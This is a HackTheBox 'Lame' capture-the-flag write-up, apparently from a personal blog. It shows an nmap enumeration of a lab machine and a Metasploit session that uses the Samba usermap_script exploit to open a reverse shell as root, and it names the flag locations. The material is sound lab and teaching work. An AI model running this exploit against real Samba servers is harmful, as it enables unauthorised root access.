---
layout: page
title: HackTheBox Lame
---

HTB Lame is a starter level machine that can be easily exploited using metasploit and some googling. Samba SMB (server message block) is a vulnerable process that in this challenge, was used to get root access into the machine using a metasploit module. To exploit this box, you just need to know basic enumeration, linux services, and some googling.

Read the full writeup [here](https://burntxnoodle.github.io/writeups/HTB-Lame/).

### Enumeration 
Using ```zenmap``` or doing ```nmap -sC -sV 10.10.10.3``` will reveal a few things:

- Ports 21, 22, 139, and 445 are open
- Port 21 has version vsftpd 2.3.4
- We are working with a linux system.

Port 20 and 21 are used for FTP. A [previous writeup](https://github.com/BurntxNoodle/PenetrationTesting/tree/master/HTB%20-%20Legacy) of mine explains what part 139 and 445 are used for. 

Here is the report from zenmap and nmap scan (both basically give the same info):
```
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to [ip]
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
```

### Exploitation 
From doing previous challenges, I know that open SMB is very vulnerable. From the nmap/zenmap reports, we know that the version of SMB is smbd ```3.0.20 - Debian``` Looking up exploits for this version I ran across this [exploit](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script) with the metasploit module ```exploit/multi/samba/usermap_script```

Here's how I used metasploit:
```
msf > use exploit/multi/samba/usermap_script
msf exploit(multi/samba/usermap_script) > 
msf exploit(multi/samba/usermap_script) > set RHOST 10.10.10.3
RHOST => 10.10.10.3

msf exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP double handler on [IP]
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo Wn1LBLehVMy92DIb;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "Wn1LBLehVMy92DIb\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened ([IP] -> 10.10.10.3:43149) at 2019-02-14 09:11:37 -0500

whoami
root
pwd
/
```

The root flag can be found in: ```/root/root.txt```
The user flag can be found in: ```/home/makis/user.txt```